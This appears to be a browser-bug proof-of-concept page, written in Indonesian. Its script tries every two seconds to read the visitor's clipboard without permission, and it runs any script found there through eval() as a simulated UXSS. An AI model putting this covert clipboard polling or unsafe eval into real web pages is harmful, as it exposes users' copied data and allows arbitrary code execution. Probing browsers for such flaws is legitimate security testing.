<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC: Victim Site - Unauthorized Clipboard Read</title>
</head>
<body>
    <h2>Menguji Celah Browser: Unauthorized Cross-Origin Read</h2>
    <p>Mencoba membaca konten clipboard secara otomatis tanpa izin pengguna...</p>

    <script>
        // Fungsi untuk membaca clipboard secara paksa
        async function tryForcedRead() {
            try {
                // Mencoba membaca isi clipboard
                const clipboardContent = await navigator.clipboard.readText();
                
                if (clipboardContent) {
                    console.log("[DITEMUKAN BUG] Clipboard berhasil dibaca secara ilegal: ", clipboardContent);
                    alert("BUG FOUND! Berhasil membaca isi clipboard domain lain:\n\n" + clipboardContent);
                    
                    // Jika isi clipboard mengandung skrip, simulasikan eksekusi (UXSS)
                    if (clipboardContent.includes("<script>")) {
                        eval(clipboardContent.replace(/<\/?script>/g, ""));
                    }
                }
            } catch (err) {
                // Di browser normal, ini akan memicu prompt izin atau langsung diblokir
                console.log("[BLOCKED] Browser aman. Pembacaan clipboard otomatis ditolak: ", err);
            }
        }

        // Jalankan pengujian otomatis setiap 2 detik untuk mensimulasikan monitoring background
        setInterval(tryForcedRead, 2000);
    </script>
</body>
</html>
